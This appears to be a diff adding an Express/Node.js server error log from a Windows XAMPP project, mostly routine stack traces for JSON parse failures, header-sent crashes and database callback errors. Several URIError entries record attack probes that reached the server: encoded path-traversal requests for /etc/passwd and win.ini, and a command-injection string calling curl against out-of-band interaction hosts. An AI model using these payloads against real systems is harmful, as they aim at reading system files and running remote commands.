+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+SyntaxError: Unexpected token t in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+SyntaxError: Unexpected token @ in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+SyntaxError: Unexpected token u in JSON at position 1
+    at JSON.parse (<anonymous>)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:89:19)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://chas4l9joors62o25100qu3rkiph1caww.oast.pro+-H+%27User-Agent:+WVykIj%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://chas4l9joors62o25100c1jatmbnkny47.oast.pro+-H+%27User-Agent:+WVykIj%27%7D;'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://chas4l9joors62o25100imt7oemw8q4ng.oast.pro+-H+%27User-Agent:+WVykIj%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http://chas4l9joors62o25100ye86rpu5xxhh4.oast.pro+-H+%27User-Agent:+WVykIj%27%7D;'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+URIError: Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00'
+    at decodeURIComponent (<anonymous>)
+    at decode_param (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:172:12)
+    at Layer.match (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:123:27)
+    at matchLayer (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:585:18)
+    at next (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:226:15)
+    at cookieParser (C:\xampp\htdocs\bauereg\api\node_modules\cookie-parser\index.js:57:14)
+    at Layer.handle [as handle_request] (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\layer.js:95:5)
+    at trim_prefix (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:328:13)
+    at C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:286:9
+    at Function.process_params (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\router\index.js:346:12)
+(node:38072) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+node:_http_outgoing:663
+    throw new ERR_HTTP_HEADERS_SENT('set');
+    ^
+
+Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
+    at new NodeError (node:internal/errors:399:5)
+    at ServerResponse.setHeader (node:_http_outgoing:663:11)
+    at ServerResponse.header (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\response.js:794:10)
+    at ServerResponse.send (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\response.js:174:12)
+    at C:\xampp\htdocs\bauereg\api\controllers\Order_Status.js:102:37
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28) {
+  code: 'ERR_HTTP_HEADERS_SENT'
+}
+
+Node.js v18.15.0
+(node:78080) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+node:_http_outgoing:663
+    throw new ERR_HTTP_HEADERS_SENT('set');
+    ^
+
+Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
+    at new NodeError (node:internal/errors:399:5)
+    at ServerResponse.setHeader (node:_http_outgoing:663:11)
+    at ServerResponse.header (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\response.js:794:10)
+    at ServerResponse.send (C:\xampp\htdocs\bauereg\api\node_modules\express\lib\response.js:174:12)
+    at C:\xampp\htdocs\bauereg\api\controllers\Order_Status.js:102:37
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:448:9
+    at Request.userCallback (C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:492:15)
+    at Request.callback (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\request.js:205:14)
+    at Parser.onEndOfMessage (C:\xampp\htdocs\bauereg\api\node_modules\tedious\lib\connection.js:2823:22)
+    at Object.onceWrapper (node:events:627:28) {
+  code: 'ERR_HTTP_HEADERS_SENT'
+}
+
+Node.js v18.15.0
+(node:29412) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:29412) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+(node:50944) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:23068) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:23068) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+(node:64440) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:59080) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:88
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:88:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:420:25
+
+Node.js v18.15.0
+(node:24736) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:24736) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+SyntaxError: Unexpected token " in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+SyntaxError: Unexpected token " in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+SyntaxError: Unexpected token " in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+SyntaxError: Unexpected token " in JSON at position 0
+    at JSON.parse (<anonymous>)
+    at createStrictSyntaxError (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:160:10)
+    at parse (C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\types\json.js:83:15)
+    at C:\xampp\htdocs\bauereg\api\node_modules\body-parser\lib\read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:204:9)
+    at invokeCallback (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:231:16)
+    at done (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:220:7)
+    at IncomingMessage.onEnd (C:\xampp\htdocs\bauereg\api\node_modules\raw-body\index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+C:\xampp\htdocs\bauereg\api\controllers\Test.js:88
+            Results = recordsets.recordsets[0]
+                                 ^
+
+TypeError: Cannot read properties of undefined (reading 'recordsets')
+    at C:\xampp\htdocs\bauereg\api\controllers\Test.js:88:34
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\base\request.js:440:25
+    at C:\xampp\htdocs\bauereg\api\node_modules\mssql\lib\tedious\request.js:420:25
+    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+
+Node.js v18.15.0
+(node:18108) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:18108) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
+(node:81968) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:70232) [DEP0123] DeprecationWarning: Setting the TLS ServerName to an IP address is not permitted by RFC 6066. This will be ignored in a future version.
+(Use `node --trace-deprecation ...` to show where the warning was created)
+(node:70232) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 error listeners added to [ConnectionPool]. Use emitter.setMaxListeners() to increase limit
